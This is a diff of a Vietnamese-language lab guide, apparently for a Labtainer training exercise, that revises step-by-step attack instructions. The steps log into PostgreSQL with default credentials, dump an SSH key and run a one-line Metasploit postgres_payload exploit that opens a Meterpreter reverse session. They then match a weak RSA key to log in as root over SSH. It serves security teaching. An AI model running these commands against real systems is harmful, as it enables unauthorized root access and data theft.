@@ -446,6 +446,7 @@
     <p style="margin: 8px 0 0 0;">
       <code style="display: inline-block; padding: 6px 12px; background: #faf0f0; border: 1px solid #f5d6d6; color: #b03a2e; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 11pt; word-break: break-all;">labtainer -r vuln-postgresql-ssh-key</code>
     </p>
+    <p style="margin: 10px 0 0 0;">Nếu đã từng thêm imodule trước đó nhưng chưa thấy lab, sinh viên chạy thêm <code>imodule -u</code> để cập nhật lại gói.</p>
   </div>
   <p style="margin-bottom: 20px;">Sau khi khởi động xong, hai terminal ảo sẽ xuất hiện. Terminal 
     <strong>attacker</strong> là máy thực hiện tấn công, 
@@ -533,10 +534,13 @@
         <code>attacker</code>, kết nối vào máy victim bằng client 
         <code>psql</code>:
       </p>
-      <pre class="language-markup"><span class="cmd">psql -h &lt;ip_victim&gt; -U postgres</span></pre>
-      <p>Nếu terminal tự mở trình phân trang khi kết quả dài, tắt pager trước khi truy vấn:</p>
       <pre class="language-markup"><span class="cmd">export PAGER=cat</span>
-<span class="cmd">export PSQL_PAGER=cat</span></pre>
+<span class="cmd">export PSQL_PAGER=cat</span>
+<span class="cmd">psql -h &lt;ip_victim&gt; -U postgres</span></pre>
+      <div class="box box-warning">
+        <strong>Lưu ý thực hành:</strong> Nếu kết quả truy vấn hiện màn hình <code>(END)</code>, đó là pager của terminal. Nhấn <code>q</code> để thoát.
+          Hai biến <code>PAGER</code> và <code>PSQL_PAGER</code> ở trên giúp hạn chế lỗi này khi làm bài.
+      </div>
       <h4>Bước 2: Đọc file tài khoản hệ thống Linux của victim</h4>
       <p>Sau khi vào giao diện 
         <code>psql</code> (dấu nhắc 
@@ -554,8 +558,9 @@
         <code>\q</code>:
       </p>
       <pre class="language-markup"><span class="cmd">\q</span></pre>
-      <p>Quay lại Terminal Linux của attacker, truy vấn và lưu khóa công khai ra file:</p>
-      <pre class="language-markup"><span class="cmd">psql -h &lt;ip_victim&gt; -U postgres -c 'SELECT auth_key FROM sshkeys LIMIT 1' | tee public_key.txt</span>
+      <p>Quay lại Terminal Linux của attacker, truy vấn và lưu khóa công khai ra file. Ở đây dùng tên cột <code>auth_key</code> thay vì <code>SELECT *</code> để tránh lỗi wrapper ghi log của Labtainer:</p>
+      <pre class="language-markup"><span class="cmd">export PGPASSWORD=postgres</span>
+<span class="cmd">psql -P pager=off -h &lt;ip_victim&gt; -U postgres -c "SELECT auth_key FROM sshkeys LIMIT 1;" | tee public_key.txt</span>
 <span class="cmd">cat public_key.txt</span></pre>
       <div class="box box-success">
         <strong>Điều kiện hoàn thành nhiệm vụ:</strong> File 
@@ -598,13 +603,14 @@
           sẽ có đặc quyền root, cho phép đọc bất kỳ file nào trên hệ thống, bao gồm
         <code>/root/fileview.txt</code>, mà không cần thay đổi quyền hệ thống.
       </div>
-      <h4>Bước 1: Nạp module exploit trong msfconsole</h4>
-      <pre class="language-markup"><span class="cmd">use exploit/linux/postgres/postgres_payload</span>
-<span class="cmd">set RHOSTS &lt;ip_victim&gt;</span>
-<span class="cmd">exploit</span></pre>
-      <h4>Bước 2: Đọc file flag từ phiên Meterpreter</h4>
-      <p>Sau khi exploit thành công, terminal sẽ chuyển sang giao diện dòng lệnh Meterpreter. Thực thi lệnh sau:</p>
-      <pre class="language-markup"><span class="cmd">cat /root/fileview.txt</span></pre>
+      <h4>Bước 1: Chạy module exploit và đọc flag qua Meterpreter</h4>
+      <p>Để kết quả được hệ thống checkwork ghi nhận ổn định, sinh viên nên chạy Metasploit bằng một lệnh duy nhất từ terminal <code>attacker</code>:</p>
+      <pre class="language-markup"><span class="cmd">msfconsole -q -x "use exploit/linux/postgres/postgres_payload; set RHOSTS &lt;ip_victim&gt;; set LHOST 192.168.1.3; run -z; sleep 15; sessions -c 'cat /root/fileview.txt'; sleep 5; exit -y"</span></pre>
+      <div class="box box-warning">
+        <strong>Lưu ý:</strong> Nếu cổng mặc định <code>4444</code> đang bận, thêm <code>set LPORT 5555;</code> ngay sau phần <code>set LHOST 192.168.1.3;</code>.
+      </div>
+      <h4>Bước 2: Kiểm tra output</h4>
+      <p>Khi exploit thành công, output của <code>msfconsole</code> cần có dòng <code>Meterpreter session ... opened</code> và nội dung <code>My string is: ...</code>.</p>
       <div class="box box-success">
         <strong>Điều kiện hoàn thành nhiệm vụ:</strong> Đọc được nội dung file 
         <code>/root/fileview.txt</code>
@@ -639,7 +645,7 @@
           trong vài giây bằng cách so sánh với kho khóa được chuẩn bị trước.
       </div>
       <h4>Bước 1: Tìm Private Key bằng fgrep</h4>
-      <p>Trích xuất phần hash của Public Key và tìm kiếm trong kho khóa được sinh sẵn:</p>
+      <p>Trích xuất phần hash của Public Key và tìm kiếm trong kho khóa được sinh sẵn. Không dùng dấu backtick vì wrapper của Labtainer có thể làm hỏng lệnh:</p>
       <pre class="language-markup"><span class="cmd">grep "ssh-rsa" public_key.txt | awk '{print $2}' | sed 's/==$//' &gt; keyhash.txt</span>
 <span class="cmd">fgrep -f keyhash.txt rsa/2048/*pub | tee private_key.txt</span>
 <span class="cmd">cat private_key.txt</span></pre>
@@ -647,15 +653,17 @@
         <strong>Đọc kết quả:</strong> Output của lệnh 
         <code>fgrep</code> trả về đường dẫn file
           dạng 
-        <code>rsa/2048/xxxxxxxx-YYYY</code>. Phần tên file (ví dụ:
-        <code>57c3115d77c56390332dc5c49978627a-5429</code>) chính là tên Private Key tương ứng
+        <code>rsa/2048/xxxxxxxx-YYYY.pub:ssh-rsa ...</code>. Khi dùng SSH, chỉ lấy phần đường dẫn trước <code>.pub</code>, không copy phần <code>:ssh-rsa AAAA...</code>.
+          Ví dụ, nếu kết quả là <code>rsa/2048/57c3115d77c56390332dc5c49978627a-5429.pub:ssh-rsa ...</code> thì private key cần dùng là
+        <code>rsa/2048/57c3115d77c56390332dc5c49978627a-5429</code>.
           mà sinh viên sẽ sử dụng ở Bước 2.
       </div>
       <h4>Bước 2: Đăng nhập SSH bằng Private Key</h4>
-      <p>Sử dụng Private Key tìm được để thiết lập phiên SSH hợp pháp với quyền root:</p>
-      <pre class="language-markup"><span class="cmd">ssh -i rsa/2048/&lt;tên_private_key&gt; root@&lt;ip_victim&gt;</span></pre>
-      <h4>Bước 3: Đọc file flag để hoàn thành nhiệm vụ</h4>
-      <pre class="language-markup"><span class="cmd">cat /root/fileview.txt</span></pre>
+      <p>Sử dụng Private Key tìm được để đọc file flag qua SSH với quyền root. Cần đặt quyền file key là <code>600</code>, nếu không SSH sẽ từ chối key:</p>
+      <pre class="language-markup"><span class="cmd">chmod 600 rsa/2048/&lt;tên_private_key&gt;</span>
+<span class="cmd">ssh -i rsa/2048/&lt;tên_private_key&gt; -o StrictHostKeyChecking=no root@&lt;ip_victim&gt; 'cat /root/fileview.txt'</span></pre>
+      <h4>Bước 3: Kiểm tra kết quả</h4>
+      <p>Nếu lệnh SSH in ra chuỗi <code>My string is: ...</code>, sinh viên đã chứng minh được có thể truy cập hệ thống bằng private key bị suy đoán.</p>
       <div class="box box-success">
         <strong>Điều kiện hoàn thành:</strong> Đăng nhập SSH thành công với quyền root và đọc được
           nội dung 
